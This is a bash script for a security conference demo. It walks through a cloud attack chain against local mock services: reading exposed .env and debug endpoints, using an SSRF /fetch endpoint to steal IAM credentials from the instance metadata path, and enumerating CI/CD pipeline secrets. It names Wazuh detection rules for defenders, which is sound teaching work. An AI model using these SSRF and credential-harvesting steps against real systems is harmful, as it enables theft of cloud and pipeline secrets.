#!/bin/bash
# ============================================================
# Offensive Kill Chain Demo Script
# "From Admin by Design to Breach by Default"
# CyberWiseCon Europe 2026
#
# Usage:
#   ./scripts/offensive-demo.sh --all           # Run full kill chain
#   ./scripts/offensive-demo.sh --stage 1       # Run specific stage
#   ./scripts/offensive-demo.sh --list          # List stages
#   ./scripts/offensive-demo.sh --fast          # Reduced pauses
# ============================================================

set -euo pipefail

# Configuration
VULN_APP="http://localhost:8888"
MOCK_IMDS="http://localhost:1338"
MOCK_CICD="http://localhost:8080"
WAZUH_DASH="https://localhost:8443"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# Timing
PAUSE=3
CMD_PAUSE=1

# Parse arguments
STAGE=""
RUN_ALL=false
LIST=false

while [[ $# -gt 0 ]]; do
    case $1 in
        --stage) STAGE="$2"; shift 2 ;;
        --all) RUN_ALL=true; shift ;;
        --list) LIST=true; shift ;;
        --fast) PAUSE=1; CMD_PAUSE=0.5; shift ;;
        --no-color) RED=''; GREEN=''; YELLOW=''; BLUE=''; CYAN=''; WHITE=''; BOLD=''; DIM=''; NC=''; shift ;;
        -h|--help)
            echo "Usage: $0 [--all | --stage N | --list | --fast | --no-color]"
            echo ""
            echo "  --all        Run all 5 kill chain stages"
            echo "  --stage N    Run stage N (1-5)"
            echo "  --list       List available stages"
            echo "  --fast       Reduced pauses between commands"
            echo "  --no-color   Disable ANSI colors"
            exit 0
            ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

# Prerequisites
command -v curl &>/dev/null || { echo "ERROR: curl required"; exit 1; }
command -v jq &>/dev/null || { echo "ERROR: jq required. Install: brew install jq"; exit 1; }

# ============================================================
# Display functions
# ============================================================

banner() {
    local stage_num=$1
    local stage_name=$2
    local mitre=$3
    echo ""
    echo -e "${RED}================================================================${NC}"
    echo -e "${RED}  STAGE ${stage_num}: ${stage_name}${NC}"
    echo -e "${DIM}  MITRE ATT&CK: ${mitre}${NC}"
    echo -e "${RED}================================================================${NC}"
    echo ""
}

narrate() {
    echo -e "${CYAN}$1${NC}"
    echo ""
    sleep "$CMD_PAUSE"
}

attack_cmd() {
    local cmd=$1
    echo -e "${YELLOW}\$ ${cmd}${NC}"
    echo ""
    eval "$cmd" 2>/dev/null || true
    echo ""
    sleep "$CMD_PAUSE"
}

impact() {
    echo ""
    echo -e "${GREEN}────────────────────────────────────────────────────────────────${NC}"
    echo -e "${GREEN}  IMPACT${NC}"
    echo -e "${WHITE}$1${NC}"
    echo -e "${GREEN}────────────────────────────────────────────────────────────────${NC}"
    echo ""
    sleep "$PAUSE"
}

divider() {
    echo ""
    echo -e "${DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

# ============================================================
# STAGE 1: RECONNAISSANCE
# ============================================================
stage_1() {
    banner "1" "RECONNAISSANCE" "T1190 - Exploit Public-Facing Application"

    narrate "An attacker discovers a web application exposed to the internet.
They begin by probing for common misconfigurations..."

    attack_cmd "curl -s ${VULN_APP}/ | jq ."

    narrate "The application exposes debug endpoints, .env files, and a /fetch
endpoint that suggests server-side request capability (SSRF)..."

    impact "  RECON COMPLETE
  - Found web app with 7 exposed endpoints
  - .env file directly accessible
  - /debug endpoint leaks environment variables
  - /fetch endpoint = potential SSRF vector
  - /git-history exposes commit diffs"
}

# ============================================================
# STAGE 2: CREDENTIAL DISCOVERY
# ============================================================
stage_2() {
    banner "2" "CREDENTIAL DISCOVERY" "T1552.001 - Credentials in Files"

    narrate "The attacker systematically harvests credentials from every
available surface on the vulnerable application..."

    narrate "[1/3] Exposed .env file:"
    attack_cmd "curl -s ${VULN_APP}/.env"

    narrate "[2/3] Debug endpoint with environment variables:"
    attack_cmd "curl -s ${VULN_APP}/debug | jq '.environment_variables'"

    narrate "[3/3] Hardcoded credentials in application config:"
    attack_cmd "curl -s ${VULN_APP}/config | jq ."

    impact "  CREDENTIALS HARVESTED
  - AWS Access Key: AKIAIOSFODNN7EXAMPLE
  - Database password: admin123_super_secret
  - GitHub token: ghp_AbCdEfGh...
  - Flask secret key, JWT signing key, Redis password
  - 6+ distinct credential types from a single application"
}

# ============================================================
# STAGE 3: CREDENTIAL THEFT VIA SSRF (CENTERPIECE)
# ============================================================
stage_3() {
    banner "3" "CREDENTIAL THEFT VIA SSRF" "T1552.005 - Cloud Instance Metadata API"

    narrate "Now the attacker uses the SSRF vulnerability to reach the cloud
metadata service. This is the EXACT attack vector used in the
2019 Capital One breach.

The /fetch endpoint makes server-side requests -- the attacker
points it at the internal IMDS endpoint that is ONLY reachable
from inside the cloud network..."

    divider

    narrate "[Step 1] Confirm IMDS is reachable via SSRF:"
    attack_cmd "curl -s '${VULN_APP}/fetch?url=http://mock-imds:1338/latest/meta-data/' | jq ."

    narrate "[Step 2] Discover IAM role attached to this instance:"
    attack_cmd "curl -s '${VULN_APP}/fetch?url=http://mock-imds:1338/latest/meta-data/iam/security-credentials/' | jq ."

    narrate "[Step 3] STEAL the IAM role credentials:"
    echo -e "${RED}${BOLD}  >>> THIS IS THE ATTACK <<<${NC}"
    echo ""
    attack_cmd "curl -s '${VULN_APP}/fetch?url=http://mock-imds:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role' | jq ."

    impact "  IAM CREDENTIALS STOLEN VIA SSRF

  AccessKeyId:     ASIADEMOTESTBED00001
  SecretAccessKey:  wJalrXUtnFEMI_DEMO_IMDS_STOLEN_KEY
  Token:           FwoGZXIvYXdzEBYaDEMOTOKENFORTESTING...

  These credentials work from ANYWHERE.
  The attacker copies them, goes home, and accesses
  your AWS account from their laptop.

  3 curl commands. No exploits. No malware."
}

# ============================================================
# STAGE 4: PRIVILEGE DISCOVERY - "ADMIN BY DESIGN"
# ============================================================
stage_4() {
    banner "4" "PRIVILEGE DISCOVERY" "T1078.004 - Valid Accounts: Cloud Accounts"

    narrate "The attacker now checks: what permissions does this stolen role have?
This is the moment we discover the role was created with
AdministratorAccess -- ADMIN BY DESIGN."

    narrate "[Step 1] Check the role's attached policies via IMDS:"
    attack_cmd "curl -s '${VULN_APP}/fetch?url=http://mock-imds:1338/latest/meta-data/iam/info' | jq ."

    narrate "AttachedPolicies: AdministratorAccess. Full admin. Every action
on every resource. This is the default that leads to breach."

    narrate "[Step 2] Verify identity with stolen credentials (sts:GetCallerIdentity):"
    attack_cmd "curl -s ${MOCK_IMDS}/sts/get-caller-identity | jq ."

    impact "  ADMIN BY DESIGN --> BREACH BY DEFAULT

  The stolen role has: AdministratorAccess
  Effective permissions: Allow *:* on *

  - No permission boundary
  - No least privilege
  - No session duration limits
  - Created with admin because 'it was easier'

  This is the #1 cloud NHI misconfiguration."
}

# ============================================================
# STAGE 5: LATERAL MOVEMENT
# ============================================================
stage_5() {
    banner "5" "LATERAL MOVEMENT" "T1528 - Steal Application Access Token"

    narrate "With admin cloud credentials, the attacker pivots to CI/CD
infrastructure. Cloud credentials often grant access to
deployment pipelines, repositories, and supply chain..."

    narrate "[1/4] Discover CI/CD server endpoints:"
    attack_cmd "curl -s ${MOCK_CICD}/ | jq '.endpoints'"

    narrate "[2/4] Enumerate GitHub Actions secrets:"
    attack_cmd "curl -s ${MOCK_CICD}/github/repos/demo/test/actions/secrets | jq ."

    narrate "[3/4] Read workflow logs -- secrets leaked in build output:"
    attack_cmd "curl -s ${MOCK_CICD}/github/repos/demo/test/actions/runs/123/logs"

    narrate "[4/4] Access GitLab CI/CD variables:"
    attack_cmd "curl -s ${MOCK_CICD}/gitlab/api/v4/projects/1/variables | jq ."

    impact "  LATERAL MOVEMENT COMPLETE

  - Pivoted from cloud workload to CI/CD pipeline
  - GitHub Actions: 3 secrets enumerated (AWS keys, deploy token)
  - Workflow logs: AWS credentials leaked in build output
  - GitLab CI: project variables with unmasked AWS keys
  - Full supply chain access achieved"
}

# ============================================================
# FINAL SUMMARY
# ============================================================
final_summary() {
    echo ""
    echo -e "${RED}================================================================${NC}"
    echo -e "${RED}${BOLD}"
    echo "   _  ___ _ _   ___ _         _         ___                _     _       "
    echo "  | |/ (_) | | / __| |_  __ _(_)_ _    / __|___ _ __  _ __| |___| |_ ___ "
    echo "  | ' <| | | || (__| ' \/ _\` | | ' \\  | (__/ _ \\ '  \\| '_ \\ / -_)  _/ -_)"
    echo "  |_|\\_\\_|_|_| \\___|_||_\\__,_|_|_||_|  \\___\\___/_|_|_| .__/_\\___|\\__\\___|"
    echo "                                                      |_|                 "
    echo -e "${NC}"
    echo -e "${WHITE}${BOLD}  FROM ADMIN BY DESIGN TO BREACH BY DEFAULT${NC}"
    echo ""
    echo -e "${WHITE}  1. RECON              --> Found vulnerable app with exposed endpoints${NC}"
    echo -e "${WHITE}  2. CRED DISCOVERY     --> Harvested secrets from .env, debug, config${NC}"
    echo -e "${RED}${BOLD}  3. CRED THEFT (SSRF)  --> SSRF to IMDS stole IAM role credentials${NC}"
    echo -e "${RED}${BOLD}  4. PRIV DISCOVERY     --> Role had AdministratorAccess (Admin by Design)${NC}"
    echo -e "${WHITE}  5. LATERAL MOVEMENT   --> Pivoted to CI/CD, accessed pipeline secrets${NC}"
    echo ""
    echo -e "${YELLOW}  Time from discovery to full admin: < 2 minutes${NC}"
    echo -e "${YELLOW}  Root cause: Default admin permissions on machine identities${NC}"
    echo ""
    echo -e "${DIM}  What defenders see: Wazuh Dashboard at ${WAZUH_DASH}${NC}"
    echo -e "${DIM}  Key alerts: Rule 100604 (.env access), 100651 (IMDS theft), 100800 (CI/CD)${NC}"
    echo -e "${RED}================================================================${NC}"
    echo ""
}

# ============================================================
# LIST STAGES
# ============================================================
list_stages() {
    echo ""
    echo -e "${BOLD}Kill Chain Stages:${NC}"
    echo ""
    echo "  1  RECON                Probe vulnerable app, discover endpoints"
    echo "  2  CRED DISCOVERY       Harvest secrets from .env, debug, config, git"
    echo "  3  CRED THEFT (SSRF)    SSRF to IMDS -- steal IAM credentials"
    echo "  4  PRIV DISCOVERY       Admin by Design -- AdministratorAccess"
    echo "  5  LATERAL MOVEMENT     Pivot to CI/CD pipeline secrets"
    echo ""
    echo "Usage:"
    echo "  $0 --stage 3      Run just Stage 3 (SSRF centerpiece)"
    echo "  $0 --all          Run all stages sequentially"
    echo "  $0 --fast         Run with reduced pauses"
    echo ""
}

# ============================================================
# MAIN
# ============================================================

if $LIST; then
    list_stages
    exit 0
fi

if [[ -n "$STAGE" ]]; then
    case $STAGE in
        1) stage_1 ;;
        2) stage_2 ;;
        3) stage_3 ;;
        4) stage_4 ;;
        5) stage_5 ;;
        *) echo "Invalid stage: $STAGE (must be 1-5)"; exit 1 ;;
    esac
    exit 0
fi

if $RUN_ALL; then
    echo ""
    echo -e "${RED}${BOLD}================================================================${NC}"
    echo -e "${RED}${BOLD}  NHI OFFENSIVE KILL CHAIN${NC}"
    echo -e "${RED}${BOLD}  From Admin by Design to Breach by Default${NC}"
    echo -e "${RED}${BOLD}================================================================${NC}"

    stage_1
    stage_2
    stage_3
    stage_4
    stage_5
    final_summary
    exit 0
fi

# Default: show help
list_stages
